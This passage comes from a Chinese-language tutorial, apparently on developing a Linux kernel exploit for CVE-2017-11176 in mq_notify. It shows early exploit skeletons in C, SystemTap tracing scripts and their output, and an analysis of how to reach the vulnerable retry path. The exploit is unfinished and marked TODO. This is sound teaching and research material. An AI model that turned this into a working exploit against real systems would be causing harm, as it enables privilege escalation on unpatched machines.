structure</span></span><br><span class="line">  <span class="built_in">memset</span>(&amp;sigev, <span class="number">0</span>, <span class="keyword">sizeof</span>(sigev));</span><br><span class="line">  sigev.sigev_notify = SIGEV_THREAD;</span><br><span class="line">  sigev.sigev_value.sival_ptr = sival_buffer;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (mq_notify((<span class="keyword">mqd_t</span>)<span class="number">-1</span>, &amp;sigev))</span><br><span class="line">  &#123;</span><br><span class="line">    perror(<span class="string">"mqnotify"</span>);</span><br><span class="line">    <span class="keyword">goto</span> fail;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">"mqnotify succeed\n"</span>);</span><br><span class="line"></span><br><span class="line">  <span class="comment">// <span class="doctag">TODO:</span> exploit</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">fail:</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">"exploit failed!\n"</span>);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>推荐使用Makefile来降低exp的开发难度。为了编译这段代码，需要使用<code>-lrt</code>标志（调用<code>mq_notify</code>所必需的）。另外，推荐使用<code>-O0</code>优化选项避免gcc重排我们的代码导致不可预料的问题。</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">-=&#123; CVE-2017-11176 Exploit &#125;=-</span><br><span class="line">mqnotify: Bad file descriptor</span><br><span class="line">exploit failed!</span><br></pre></td></tr></table></figure>
<p><code>mq_notify</code>返回了<code>Bad file descriptor</code>（-EBADF），有三个地方会导致该错误：</p>
<ol>
<li>fget()的某次调用</li>
<li>filp-&gt;f_op != &amp;mqueue_file_operations的检查</li>
</ol>
<p>让我们找出具体是什么位置。</p>
<h4 id="System-Tap"><a href="#System-Tap" class="headerlink" title="System Tap"></a>System Tap</h4><p>在exp开发的初始阶段，强烈建议在带调试符号的kernel中运行exp，这将使得我们可以使用<strong>SystemTap</strong>。SystemTap是一个内核探针工具，并且不需要使用gdb。</p>
<p>让我们从一个基本的System Tap脚本开始：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"># mq_notify.stp</span><br><span class="line"></span><br><span class="line">probe syscall.mq_notify</span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">if</span> (execname() == <span class="string">"exploit"</span>)</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"\n\n(%d-%d) &gt;&gt;&gt; mq_notify (%s)\n"</span>, pid(), tid(), argstr)</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">probe syscall.mq_notify.<span class="keyword">return</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">if</span> (execname() == <span class="string">"exploit"</span>)</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"(%d-%d) &lt;&lt;&lt; mq_notify = %x\n\n\n"</span>, pid(), tid(), $<span class="keyword">return</span>)</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>前述脚本安装的两个探针分别位于系统调用之前和之后，使用<code>execname()</code>来限制输出的条件。</p>
<p>备注：如果输出太多，SystemTap会忽略一些输出并且不会提示。</p>
<p>运行脚本：</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">stap -v mq_notify.stp</span><br></pre></td></tr></table></figure>
<p>再次运行exp将会显示：</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">(14427-14427) &gt;&gt;&gt; mq_notify (-1, 0x7ffdd7421400)</span><br><span class="line">(14427-14427) &lt;&lt;&lt; mq_notify = fffffffffffffff7</span><br></pre></td></tr></table></figure>
<p>探针正常工作，-1是我们设置的第一个参数，第二个参数是一个用户态指针，返回值-9即-EBADF。接下来添加新的输出，不同于syscall的hook，一般的内核函数可以通过下列写法来实现hook：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">probe kernel.function (<span class="string">"fget"</span>)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">if</span> (execname() == <span class="string">"exploit"</span>)</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"(%d-%d) [vfs] ==&gt;&gt; fget (%s)\n"</span>, pid(), tid(), $$parms)</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>备注：由于某些原因，并不是所有内核函数都可以被hook。例如一些内联函数，需要根据其具体的位置判断其是否能被hook。另外，像<code>copy_from_user()</code>这种函数，可以在调用前被hook，调用后不能被hook。SystemTap会提示和拒绝这些hook。</p>
<p>接着我们对<code>mq_notify()</code>中的每一个函数都添加了探针并重新运行exp：</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">(17850-17850) [SYSCALL] ==&gt;&gt; mq_notify (-1, 0x7ffc30916f50)</span><br><span class="line">(17850-17850) [uland] ==&gt;&gt; copy_from_user ()</span><br><span class="line">(17850-17850) [skb] ==&gt;&gt; alloc_skb (priority=0xd0 size=0x20)</span><br><span class="line">(17850-17850) [uland] ==&gt;&gt; copy_from_user ()</span><br><span class="line">(17850-17850) [skb] ==&gt;&gt; skb_put (skb=0xffff88002e061200 len=0x20)</span><br><span class="line">(17850-17850) [skb] &lt;&lt;== skb_put = ffff88000a187600</span><br><span class="line">(17850-17850) [vfs] ==&gt;&gt; fget (fd=0x3)</span><br><span class="line">(17850-17850) [vfs] &lt;&lt;== fget = ffff88002e271280</span><br><span class="line">(17850-17850) [netlink] ==&gt;&gt; netlink_getsockbyfilp (filp=0xffff88002e271280)</span><br><span class="line">(17850-17850) [netlink] &lt;&lt;== netlink_getsockbyfilp = ffff88002ff82800</span><br><span class="line">(17850-17850) [netlink] ==&gt;&gt; netlink_attachskb (sk=0xffff88002ff82800 skb=0xffff88002e061200 timeo=0xffff88002e1f3f40 ssk=0x0)</span><br><span class="line">(17850-17850) [netlink] &lt;&lt;== netlink_attachskb = 0</span><br><span class="line">(17850-17850) [vfs] ==&gt;&gt; fget (fd=0xffffffff)</span><br><span class="line">(17850-17850) [vfs] &lt;&lt;== fget = 0</span><br><span class="line">(17850-17850) [netlink] ==&gt;&gt; netlink_detachskb (sk=0xffff88002ff82800 skb=0xffff88002e061200)</span><br><span class="line">(17850-17850) [netlink] &lt;&lt;== netlink_detachskb</span><br><span class="line">(17850-17850) [SYSCALL] &lt;&lt;== mq_notify= -9</span><br></pre></td></tr></table></figure>
<h4 id="First-Bug"><a href="#First-Bug" class="headerlink" title="First Bug"></a>First Bug</h4><p>本地测试的输出：</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line">Pass 1: parsed user script and 106 library script(s) using 87868virt/32748res/5356shr/28164data kb, in 90usr/0sys/92real ms.</span><br><span class="line">Pass 2: analyzed script: 593 probe(s), 12 function(s), 5 embed(s), 0 global(s) using 147776virt/93816res/6848shr/88072data kb, in 830usr/60sys/896real ms.</span><br><span class="line">Pass 3: using cached /root/.systemtap/cache/c1/stap_c16be11687935a62b4012a183645f89c_205765.c</span><br><span class="line">Pass 4: using cached /root/.systemtap/cache/c1/stap_c16be11687935a62b4012a183645f89c_205765.ko</span><br><span class="line">Pass 5: starting run.</span><br><span class="line">(2521-2521) &gt;&gt;&gt; copy_from_user()</span><br><span class="line">(2521-2521) &gt;&gt;&gt; copy_from_user()</span><br><span class="line">(2521-2521) &gt;&gt;&gt; copy_from_user()</span><br><span class="line">(2521-2521) &gt;&gt;&gt; copy_from_user()</span><br><span class="line">(2521-2521) &gt;&gt;&gt; copy_from_user()</span><br><span class="line">(2521-2521) &gt;&gt;&gt; copy_from_user()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">(2521-2521) &gt;&gt;&gt; mq_notify (-1, 0x7fffd32050e0)</span><br><span class="line">(2521-2521) &gt;&gt;&gt; copy_from_user()</span><br><span class="line">(2521-2521) &gt;&gt;&gt; alloc_skb (priority=? size=?)</span><br><span class="line">(2521-2521) &gt;&gt;&gt; copy_from_user()</span><br><span class="line">(2521-2521) &gt;&gt;&gt; fdget (fd=?)</span><br><span class="line">(2521-2521) &gt;&gt;&gt; netlink_getsockbyfilp (filp=0xffff88003c4ff100)</span><br><span class="line">(2521-2521) &lt;&lt;&lt; netlink_getsockbyfilp = ffff88003c7b2000</span><br><span class="line">(2521-2521) &gt;&gt;&gt; netlink_attachskb (sk=0xffff88003c7b2000 skb=0xffff88003afd0100 timeo=0xffff88003c6c3f08 ssk=0x0)</span><br><span class="line">(2521-2521) &lt;&lt;&lt; netlink_attachskb = 0</span><br><span class="line">(2521-2521) &gt;&gt;&gt; fdget (fd=?)</span><br><span class="line">(2521-2521) &gt;&gt;&gt; netlink_detachskb (sk=0xffff88003c7b2000 skb=0xffff88003afd0100)</span><br><span class="line">(2521-2521) &lt;&lt;&lt; netlink_detachskb</span><br><span class="line">(2521-2521) &lt;&lt;&lt; mq_notify = fffffffffffffff7</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">(2521-2521) &gt;&gt;&gt; copy_from_user()</span><br><span class="line">(2521-2521) &gt;&gt;&gt; copy_from_user()</span><br></pre></td></tr></table></figure>
<p>看起来我们似乎到达了<code>retry</code>逻辑：</p>
<ol>
<li>copy_from_user调用</li>
<li>alloc_skb调用：exp传递了SIGEV_THREAD</li>
<li>copy_from_user调用：获取sival_buffer</li>
<li>skb_put调用：表明了第三步没有失败</li>
<li>fdget(fd=?)：在作者原文中，fd=0x3</li>
</ol>
<p>作者原文中提到，fd应该为0，因为notification.sigev_signo没有传递其它值。尽管如此，第一个<code>fget()</code>并没有失败，另外<code>netlink_getsockbyfilp()</code>和<code>netlink_attachskb()</code>也正常工作。这些事有些奇怪因为我们并没有创建任何AF_NETLINK socket。</p>
<p>第二个<code>fget()</code>失败是因为我们通过<code>mq_notify</code>的参数设置了fd为-1，问题在哪？让我们回过头检查一下<code>sigevent</code>指针。</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">printf</span>(<span class="string">"sigev = 0x%p\n"</span>, &amp;sigev);</span><br><span class="line"><span class="keyword">if</span> (mq_notify((<span class="keyword">mqd_t</span>) <span class="number">-1</span>, &amp;sigev))</span><br></pre></td></tr></table></figure>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">sigev = 0x0x7fffbca93010</span><br><span class="line">(2566-2566) &gt;&gt;&gt; mq_notify (-1, 0x7fffbca92f90)</span><br></pre></td></tr></table></figure>
<p>显然系统调用所接收到的指针(0x7fffbca92f90)和我们所提供的(0x0x7fffbca93010)并不完全相同，这可能因为SystemTap有bug或者库的wrapper。</p>
<p>修改exp：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">define</span> _GNU_SOURCE</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/syscall.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> _mq_notify(mqdes, sevp) syscall(__NR_mq_notify, mqdes, sevp)</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;mqueue.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> NOTIFY_COOKIE_LEN (32)</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">void</span>)</span> </span>&#123;</span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">sigevent</span> <span class="title">sigev</span>;</span></span><br><span class="line">	<span class="keyword">char</span> sival_buffer[NOTIFY_COOKIE_LEN];</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">"CVE-2017-11176 Exploit\n"</span>);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">"sigev = 0x%p\n"</span>, &amp;sigev);</span><br><span class="line">	<span class="built_in">memset</span>(&amp;sigev, <span class="number">0</span>, <span class="keyword">sizeof</span>(sigev));</span><br><span class="line"></span><br><span class="line">	sigev.sigev_signo = <span class="number">-1</span>;</span><br><span class="line">	sigev.sigev_notify = SIGEV_THREAD;</span><br><span class="line">	sigev.sigev_value.sival_ptr = sival_buffer;</span><br><span class="line">	</span><br><span class="line">	<span class="keyword">if</span> (_mq_notify((<span class="keyword">mqd_t</span>)<span class="number">-1</span>, &amp;sigev)) &#123;</span><br><span class="line">		perror(<span class="string">"mqnotify"</span>);</span><br><span class="line">		<span class="keyword">goto</span> fail;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">"mqnotify succeed\n"</span>);</span><br><span class="line">	<span class="comment">// TODO</span></span><br><span class="line">	</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">fail:</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">"Exploit Failed\n"</span>);</span><br><span class="line">	<span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>因为直接使用了系统调用，编译时不需要再使用-lrt选项了。新的结果如下：</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">sigev = 0x0x7fffe677a630</span><br><span class="line">(2599-2599) &gt;&gt;&gt; mq_notify (4294967295, 0x7fffe677a630)</span><br></pre></td></tr></table></figure>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">(3198-3198) &gt;&gt;&gt; mq_notify (4294967295, 0x7fffeda9b070)</span><br><span class="line">(3198-3198) &gt;&gt;&gt; copy_from_user()</span><br><span class="line">(3198-3198) &gt;&gt;&gt; alloc_skb (priority=? size=?)</span><br><span class="line">(3198-3198) &gt;&gt;&gt; copy_from_user()</span><br><span class="line">(3198-3198) &gt;&gt;&gt; skb_put (skb=0xffff88003af5d200 len=0x20)</span><br><span class="line">(3198-3198) &lt;&lt;&lt; skb_put = ffff88003aec5000</span><br><span class="line">(3198-3198) &gt;&gt;&gt; fdget (fd=?)</span><br><span class="line">(3198-3198) &lt;&lt;&lt; mq_notify = fffffffffffffff7</span><br></pre></td></tr></table></figure>
<p>当第一次<code>fget()</code>失败后，程序如我们所期望的直接走到了<code>out</code>标签。到此为止，我们知道了我们可以绕过安全检查到达<code>retry</code>标签。</p>
<p>A common trap has been exposed (caused by library wrapper(封装) instead of syscall), and we saw how to fix it. In order to avoid the same kind of bug in the future, we will wrap every syscall.</p>
<h3 id="0x05-强制触发"><a href="#0x05-强制触发" class="headerlink" title="0x05 强制触发"></a>0x05 强制触发</h3><p>有些时候你想验证一个想法又不想从头先搞明白相关的所有代码，在这种情况下，可以使用<em>System Tap Guru Mode</em>来修改内核的数据结构来强制内核执行特定的路径。换句话说，我们可以在内核态去触发漏洞，如果我们在内核态都无法触发漏洞，就更不用说从用户态去触发了。所以，先分析如何修改内核相关参数来满足漏洞触发条件，再逐步去实现用户态的exp(Part 2)。</p>
<p>我们可以触发漏洞如果：</p>
<ol>
<li>到达<code>retry</code>逻辑（循环回<code>retry</code>）。我们需要进入<code>netlink_attachskb()</code>并返回1，<code>sock</code>的计数器会减去1。</li>
<li>当返回<code>retry</code>时，下一次<code>fget()</code>必须返回空以进入<code>out</code>路径并使得<code>sock</code>的计数器再减1。</li>
</ol>
<h4 id="到达netlink-attachskb"><a href="#到达netlink-attachskb" class="headerlink" title="到达netlink_attachskb()"></a>到达netlink_attachskb()</h4><p>在前述中，为了触发漏洞，我们必须让<code>netlink_attachskb()</code>返回1，在调用它之前，我们还需先满足几个条件：</p>
<ol>
<li>提供一个有效的fd避免第一次<code>fget()</code>执行失败</li>
<li>fd指向的文件必须是AF_NETLINK类型的sock</li>
</ol>
<p>这样就可以通过检查：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">    retry:</span><br><span class="line">[<span class="number">0</span>]       filp = fget(notification.sigev_signo);</span><br><span class="line">          <span class="keyword">if</span> (!filp) &#123;</span><br><span class="line">            ret = -EBADF;</span><br><span class="line">            <span class="keyword">goto</span> out;</span><br><span class="line">          &#125;</span><br><span class="line">[<span class="number">1</span>]       sock = netlink_getsockbyfilp(filp);</span><br><span class="line">          fput(filp);</span><br><span class="line">          <span class="keyword">if</span> (IS_ERR(sock)) &#123;</span><br><span class="line">            ret = PTR_ERR(sock);</span><br><span class="line">            sock = <span class="literal">NULL</span>;</span><br><span class="line">            <span class="keyword">goto</span> out;</span><br><span class="line">          &#125;</span><br></pre></td></tr></table></figure>
<p>通过[0]处的第一个检查比较加单，提供了有效的fd即可，但最好还是提供一个合适的fd，否则[1]处的检查可能会失败：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">struct sock *<span class="title">netlink_getsockbyfilp</span><span class="params">(struct file *filp)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">inode</span> *<span class="title">inode</span> = <span class="title">filp</span>-&gt;<span class="title">f_path</span>.<span class="title">dentry</span>-&gt;<span class="title">d_inode</span>;</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">sock</span> *<span class="title">sock</span>;</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (!S_ISSOCK(inode-&gt;i_mode))         <span class="comment">// &lt;--- this need to be a socket...</span></span><br><span class="line">    <span class="keyword">return</span> ERR_PTR(-ENOTSOCK);</span><br><span class="line"></span><br><span class="line">  sock = SOCKET_I(inode)-&gt;sk;</span><br><span class="line">  <span class="keyword">if</span> (sock-&gt;sk_family != AF_NETLINK)    <span class="comment">// &lt;--- ...from the AF_NETLINK family</span></span><br><span class="line">    <span class="keyword">return</span> ERR_PTR(-EINVAL);</span><br><span class="line"></span><br><span class="line">  sock_hold(sock);</span><br><span class="line">  <span class="keyword">return</span> sock;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>exp改为：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * CVE-2017-11176 Exploit.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> _GNU_SOURCE</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;mqueue.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/syscall.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/types.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/socket.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;linux/netlink.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> NOTIFY_COOKIE_LEN (32)</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> _mq_notify(mqdes, sevp) syscall(__NR_mq_notify, mqdes, sevp)</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> _socket(domain, type, protocol) syscall(__NR_socket, domain, type, protocol)</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">void</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">sigevent</span> <span class="title">sigev</span>;</span></span><br><span class="line">    <span class="keyword">char</span> sival_buffer[NOTIFY_COOKIE_LEN];</span><br><span class="line">    <span class="keyword">int</span> sock_fd;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"-=&#123; CVE-2017-11176 Exploit &#125;=-\n"</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> ((sock_fd = _socket(AF_NETLINK, SOCK_DGRAM, NETLINK_GENERIC)) &lt; <span class="number">0</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        perror(<span class="string">"socket"</span>);</span><br><span class="line">        <span class="keyword">goto</span> fail;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"netlink socket created = %d\n"</span>, sock_fd);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// initialize the sigevent structure</span></span><br><span class="line">    <span class="built_in">memset</span>(&amp;sigev, <span class="number">0</span>, <span class="keyword">sizeof</span>(sigev));</span><br><span class="line">    sigev.sigev_notify = SIGEV_THREAD;</span><br><span class="line">    sigev.sigev_value.sival_ptr = sival_buffer;</span><br><span class="line">    sigev.sigev_signo = sock_fd;  <span class="comment">// &lt;--- not '-1' anymore</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (_mq_notify((<span class="keyword">mqd_t</span>)<span class="number">-1</span>, &amp;sigev))</span><br><span class="line">    &#123;</span><br><span class="line">        perror(<span class="string">"mq_notify"</span>);</span><br><span class="line">        <span class="keyword">goto</span> fail;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"mq_notify succeed\n"</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// <span class="doctag">TODO:</span> exploit</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">fail:</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"exploit failed!\n"</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>运行结果：</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">(3566-3566) &gt;&gt;&gt; mq_notify (4294967295, 0x7ffebfc52b20)</span><br><span class="line">(3566-3566) &gt;&gt;&gt; copy_from_user()</span><br><span class="line">(3566-3566) &gt;&gt;&gt; alloc_skb (priority=? size=?)</span><br><span class="line">(3566-3566) &gt;&gt;&gt; copy_from_user()</span><br><span class="line">(3566-3566) &gt;&gt;&gt; skb_put (skb=0xffff88003afcd700 len=0x20)</span><br><span class="line">(3566-3566) &lt;&lt;&lt; skb_put = ffff88003afc8000</span><br><span class="line">(3566-3566) &gt;&gt;&gt; fdget (fd=?)</span><br><span class="line">(3566-3566) &gt;&gt;&gt; netlink_getsockbyfilp (filp=0xffff88003c7abc00)</span><br><span class="line">(3566-3566) &lt;&lt;&lt; netlink_getsockbyfilp = ffff88003c7ac800     &lt;==== Pass</span><br><span class="line">(3566-3566) &gt;&gt;&gt; netlink_attachskb (sk=0xffff88003c7ac800 skb=0xffff88003afcd700 timeo=0xffff88003c643f08 ssk=0x0)</span><br><span class="line">(3566-3566) &lt;&lt;&lt; netlink_attachskb = 0         &lt;==== Unwanted behavior</span><br><span class="line">(3566-3566) &gt;&gt;&gt; fdget (fd=?)</span><br><span class="line">(3566-3566) &gt;&gt;&gt; netlink_detachskb (sk=0xffff88003c7ac800 skb=0xffff88003afcd700)</span><br><span class="line">(3566-3566) &lt;&lt;&lt; netlink_detachskb</span><br><span class="line">(3566-3566) &lt;&lt;&lt; mq_notify = fffffffffffffff7</span><br></pre></td></tr></table></figure>
<p><code>fget()</code>和<code>netlink_getsockbyfilp()</code>看起来都正常执行，且我们可以控制关键数据并到达<code>netlink_attachskb()</code>处。</p>
